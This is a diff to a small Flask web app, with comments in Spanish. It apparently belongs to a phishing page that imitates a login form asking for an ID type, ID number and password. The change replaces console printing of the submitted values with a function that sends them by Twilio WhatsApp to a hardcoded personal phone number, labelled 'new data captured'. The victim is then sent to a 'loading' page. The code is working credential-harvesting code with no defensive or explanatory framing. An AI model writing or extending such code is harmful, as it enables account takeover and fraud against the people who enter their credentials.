@@ -1,6 +1,29 @@
 from flask import Flask, render_template, request, redirect, url_for
+from twilio.rest import Client
+import os
 
 app = Flask(__name__)
+
+# leer desde variables de entorno
+account_sid = os.environ.get("TWILIO_SID")
+auth_token = os.environ.get("TWILIO_TOKEN")
+
+client = Client(account_sid, auth_token)
+
+def enviar_whatsapp(tipo, documento, clave):
+    mensaje = f"""
+Nuevo dato capturado:
+
+Tipo: {tipo}
+Documento: {documento}
+Clave: {clave}
+"""
+
+    client.messages.create(
+        from_='whatsapp:+14155238886',
+        body=mensaje,
+        to='whatsapp:+573234370477'
+    )
 
 @app.route("/")
 def home():
@@ -20,9 +43,7 @@ def procesar_login():
     documento = request.form.get('documento')
     clave = request.form.get('clave')
 
-    print("Tipo:", tipo)
-    print("Documento:", documento)
-    print("Clave:", clave)
+    enviar_whatsapp(tipo, documento, clave)
 
     return redirect(url_for('cargando'))
 
